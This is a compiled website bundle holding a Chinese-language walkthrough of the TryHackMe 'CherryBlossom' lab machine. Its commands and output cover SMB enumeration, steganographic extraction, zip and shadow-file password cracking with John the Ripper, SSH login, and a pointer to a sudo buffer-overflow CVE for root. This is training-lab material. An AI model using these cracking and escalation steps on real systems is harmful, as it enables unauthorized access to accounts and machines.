"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1240],{26382:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>i,contentTitle:()=>t,default:()=>h,frontMatter:()=>r,metadata:()=>l,toc:()=>c});var o=s(74848),a=s(28453);const r={sidebar_position:184,tags:["Easy","Linux","\u6587\u4ef6\u9690\u5199"],title:"CherryBlossom",description:"CherryBlossom",sidebar_label:"CherryBlossom",slug:"/tryhackme/184"},t="CherryBlossom",l={id:"box/TryHackMe/184",title:"CherryBlossom",description:"CherryBlossom",source:"@site/docs/box/TryHackMe/184.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/184",permalink:"/docs/tryhackme/184",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u9690\u5199",permalink:"/docs/tags/\u6587\u4ef6\u9690\u5199"}],version:"current",sidebarPosition:184,frontMatter:{sidebar_position:184,tags:["Easy","Linux","\u6587\u4ef6\u9690\u5199"],title:"CherryBlossom",description:"CherryBlossom",sidebar_label:"CherryBlossom",slug:"/tryhackme/184"},sidebar:"boxSidebar",previous:{title:"Set",permalink:"/docs/tryhackme/183"},next:{title:"For Business Reasons",permalink:"/docs/tryhackme/185"}},i={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"SMB",id:"smb",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"lily",id:"lily",level:3},{value:"lily \u2014&gt; johan",id:"lily--johan",level:3},{value:"johan \u2014&gt; root",id:"johan--root",level:3}];function d(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...n.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(e.h1,{id:"cherryblossom",children:"CherryBlossom"}),"\n",(0,o.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-171-114:~# nmap -sTCV -p- --min-rate 1000 10.10.186.204\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-11-19 04:10 GMT\nNmap scan report for ip-10-10-186-204.eu-west-1.compute.internal (10.10.186.204)\nHost is up (0.0058s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)\n|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)\n|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (EdDSA)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nMAC Address: 02:10:46:A6:BE:E3 (Unknown)\nService Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: cherryblossom\n|   NetBIOS computer name: UBUNTU\\x00\n|   Domain name: \\x00\n|   FQDN: cherryblossom\n|_  System time: 2023-11-19T04:10:35+00:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-11-19 04:10:35\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.74 seconds\n"})}),"\n",(0,o.jsx)(e.h2,{id:"smb",children:"SMB"}),"\n",(0,o.jsx)(e.p,{children:"\u4ece\u626b\u63cf\u4e2d\u53ef\u4ee5\u53d1\u73b0\u53ea\u6709 SMB\u670d\u52a1\u53ef\u4ee5\u5229\u7528"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-171-114:~# smbmap.py -H 10.10.186.204\n\n    ________  ___      ___  _______   ___      ___       __         _______\n   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /\' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __\'  \\    (|  /\n   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   \n                     https://github.com/ShawnDEvans/smbmap\n\n                                                                                                    \n[+] IP: 10.10.186.204:445\tName: ip-10-10-186-204.eu-west-1.compute.internal\tStatus: Guest session   \t\n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tAnonymous                                         \tREAD ONLY\tAnonymous File Server Share\n\tIPC$                                              \tNO ACCESS\tIPC Service (Samba 4.7.6-Ubuntu)\nroot@ip-10-10-171-114:~# smbclient \\\\\\\\10.10.186.204\\\\Anonymous\nWARNING: The "syslog" option is deprecated\nEnter WORKGROUP\\root\'s password: \nAnonymous login successful\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Feb 10 00:22:51 2020\n  ..                                  D        0  Sun Feb  9 17:48:18 2020\n  journal.txt                         N  3470998  Mon Feb 10 00:20:53 2020\n\n\t\t10253588 blocks of size 1024. 4680676 blocks available\n'})}),"\n",(0,o.jsx)(e.p,{children:"\u67e5\u770b\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a base64 \u52a0\u5bc6\u7684\u5185\u5bb9. \u56e0\u6b64\u6211\u5c06\u5176\u8fdb\u884c\u89e3\u5bc6\u5e76\u91cd\u5b9a\u5411\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d, \u53d1\u73b0\u662f\u4e00\u4e2a PNG \u56fe\u7247\u90a3\u5c31\u662f\u6587\u4ef6\u9690\u5199\u4e86"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-171-114:~# cat journal.txt | base64 -d > journal_base64\nroot@ip-10-10-171-114:~# file journal_base64 \njournal_base64: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced\nroot@ip-10-10-171-114:~# mv journal_base64 journal_base64.png\nroot@907616ea6d86:/data# zsteg -a  journal.png \n.....\nb4,bgr,lsb,xy,prime .. file: PGP\\011Secret Key -\n....\n"})}),"\n",(0,o.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,o.jsx)(e.code,{children:"zsteg"})," \u5de5\u5177\u540e\u6211\u53d1\u73b0\u4e00\u4e9b\u5185\u5bb9\u610f\u8bc6\u5230\u8fd9\u662f LSB \u52a0\u5bc6\u4e4b\u540e\u4fbf\u5f00\u59cb\u4e86\u63d0\u53d6\u5de5\u4f5c, \u4f46\u662f\u4ece\u8f93\u51fa\u4e2d\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u6587\u4ef6\u7684\u5e7b\u6570\u5e76\u4e0d\u6b63\u786e, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e8c\u6b21\u4fee\u6539\u5e76\u8fdb\u884c\u89e3\u5bc6 zip \u6587\u4ef6"]}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"root@907616ea6d86:/data# stegpy journal.png \nFile _journal.zip succesfully extracted from journal.png\nroot@907616ea6d86:/data# ls\n1.txt  _journal.zip   journal.png \nroot@907616ea6d86:/data# file _journal.zip \n_journal.zip: JPEG image data\nroot@907616ea6d86:/data# hexedit _journal.zip \nroot@907616ea6d86:/data# file _journal.zip\n_journal.zip: Zip archive data, at least v2.0 to extract\nroot@ip-10-10-48-35:~/cherryblossom# zip2john _journal.zip  > hash.txt\nver 2.0 efh 5455 efh 7875 _journal.zip/Journal.ctz PKZIP Encr: 2b chk, TS_chk, cmplen=70461, decmplen=70434, crc=B987D84 type=8\nroot@ip-10-10-48-35:~/cherryblossom# john hash.txt --wordlist=`locate rockyou.txt`\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nseptember        (_journal.zip/Journal.ctz)\n1g 0:00:00:00 DONE (2023-11-19 07:37) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \nroot@ip-10-10-48-35:~/cherryblossom# ls\n1.txt  hash.txt  journal.pgp  journal.png  journal.txt  _journal.zip\nroot@ip-10-10-48-35:~/cherryblossom# unzip _journal.zip \nArchive:  _journal.zip\n[_journal.zip] Journal.ctz password: \n  inflating: Journal.ctz\n"})}),"\n",(0,o.jsxs)(e.p,{children:["\u89e3\u538b zip \u6587\u4ef6\u540e\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 7z \u6587\u4ef6\u6b64\u65f6\u9700\u8981\u91cd\u65b0\u8fdb\u884c\u52a0\u5bc6, \u8fd9\u91cc\u56e0\u4e3a\u81ea\u5df1\u73af\u5883\u7684\u539f\u56e0\u5bfc\u81f4\u6ca1\u6709\u529e\u6cd5\u8fdb\u884c\u89e3\u5bc6, \u76f4\u63a5\u770b\u4e86\u522b\u4eba\u7684 WP \u83b7\u53d6\u5230\u89e3\u538b\u5bc6\u7801 ",(0,o.jsx)(e.code,{children:"tigerlily"})," , \u89e3\u5bc6\u4e4b\u540e\u5f97\u5230\u4e00\u4e2a ",(0,o.jsx)(e.code,{children:"Journal.ctd"})," \u5176\u5b9e\u8fd9\u662f\u4e00\u4e2a xml \u6587\u4ef6, \u5728\u8fd9\u5176\u4e2d\u5b58\u5728\u5927\u91cf\u4f7f\u7528 base64 \u52a0\u5bc6\u7684\u5bc6\u7801\u5217\u8868, \u5e76\u4e14\u4ece\u5176\u4e2d\u7684\u5185\u5bb9\u4e5f\u53ef\u4ee5\u77e5\u9053\u5bf9\u5e94\u7684\u7528\u6237 ",(0,o.jsx)(e.code,{children:"lily"})," \u662f\u4f7f\u7528\u5176\u4e2d\u7684\u5bc6\u7801\u4f5c\u4e3a SSH \u7684\u5bc6\u7801\u7684"]}),"\n",(0,o.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(e.h3,{id:"lily",children:"lily"}),"\n",(0,o.jsx)(e.p,{children:(0,o.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-230959.png",alt:"image-20240709230958710"})}),"\n",(0,o.jsx)(e.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u8d26\u53f7\u8fdb\u884c SSH \u8fdc\u7a0b\u767b\u9646\u5373\u53ef"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-10-19:~/cherryblossom# ssh lily@10.10.153.164\nThe authenticity of host '10.10.153.164 (10.10.153.164)' can't be established.\nECDSA key fingerprint is SHA256:EZ3f3eJR3ecE+aLZiYDNKp3dQHqtk2nrhusPPN5Xruc.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.153.164' (ECDSA) to the list of known hosts.\nlily@10.10.153.164's password: \n\n\t#####################################\n\t##########  Welcome, Lily  ##########\n        #####################################\n\nlily@cherryblossom:~$ id\nuid=1002(lily) gid=1002(lily) groups=1002(lily)\n"})}),"\n",(0,o.jsx)(e.h3,{id:"lily--johan",children:"lily \u2014> johan"}),"\n",(0,o.jsxs)(e.p,{children:["\u67e5\u770b\u4fe1\u606f\u53d1\u73b0\u5728 ",(0,o.jsx)(e.code,{children:"/tmp"})," \u76ee\u5f55\u4e0b\u5b58\u5728\u4e00\u4e2a ",(0,o.jsx)(e.code,{children:"shadow.bak"})," \u6587\u4ef6\u53ef\u4ee5\u4ece\u4e2d\u89e3\u5bc6\u6765\u83b7\u53d6\u5230 johan \u7528\u6237\u4ee5\u53ca root \u7528\u6237\u7684\u54c8\u5e0c, \u4f46\u662f\u4f30\u8ba1 root \u7528\u6237\u5c31\u4e0d\u7528\u8bd5\u4e86\u76f4\u63a5 johan \u7528\u6237\u8fdb\u884c\u7834\u89e3\u5904\u7406"]}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:'backups  cache  crash  lib  local  lock  log  mail  metrics  opt  run  snap  spool  tmp\nlily@cherryblossom:/var$ ls -al backups/\ntotal 2000\n-r--r--r--  1 root shadow    1481 Feb  9  2020 shadow.bak\n\nroot@ip-10-10-10-19:~/cherryblossom# john hash.txt --wordlist=./cherry-blossom.list \nWarning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"\nUse the "--format=sha512crypt-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n##scuffleboo##   (johan)\n1g 0:00:00:12 DONE (2023-11-19 09:09) 0.07898g/s 545.9p/s 545.9c/s 545.9C/s #sharry#1992..#music28\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,o.jsx)(e.h3,{id:"johan--root",children:"johan \u2014> root"}),"\n",(0,o.jsxs)(e.p,{children:["\u5728\u67e5\u770b johan \u7528\u6237\u65f6\u6211\u53d1\u73b0\u5176\u5c5e\u4e8e\u4e00\u4e2a\u7279\u6b8a\u7684\u7ec4 ",(0,o.jsx)(e.code,{children:"devs"})," \u56e0\u6b64\u6211\u5f00\u59cb\u679a\u4e3e\u6b64\u7279\u6b8a\u7528\u6237\u7ec4, \u6700\u7ec8\u53d1\u73b0\u8be5\u7528\u6237\u7684\u4e00\u4e2a\u7279\u6b8a\u6587\u4ef6 ",(0,o.jsx)(e.code,{children:"sudo"})," , \u5728\u6211\u5c1d\u8bd5\u5229\u7528\u6b64\u8fdb\u884c\u67e5\u770b\u65f6, \u6211\u53d1\u73b0\u5176\u5b58\u5728\u56de\u663e\u5bf9\u5e94\u7684\u8fd9\u4e2a\u7248\u672c\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e ",(0,o.jsx)(e.a,{href:"https://github.com/saleemrashid/sudo-cve-2019-18634",children:"sudo-cve-2019-18634"})]}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-bash",children:"lily@cherryblossom:/var/backups$ su johan\nPassword: \njohan@cherryblossom:/var/backups$ id\nuid=1001(johan) gid=1001(johan) groups=1001(johan),1003(devs)\njohan@cherryblossom:~$ find / -group 1003 2>/dev/null\n/usr/bin/sudo\njohan@cherryblossom:~$ ls -al /usr/bin/sudo\n-rwsr-x--- 1 root devs 149080 Jan 18  2018 /usr/bin/sudo\n"})}),"\n",(0,o.jsx)(e.p,{children:(0,o.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-231025.png",alt:"image-20240709231024189"})})]})}function h(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,o.jsx)(e,{...n,children:(0,o.jsx)(d,{...n})}):d(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>t,x:()=>l});var o=s(96540);const a={},r=o.createContext(a);function t(n){const e=o.useContext(r);return o.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:t(n.components),o.createElement(r.Provider,{value:e},n.children)}}}]);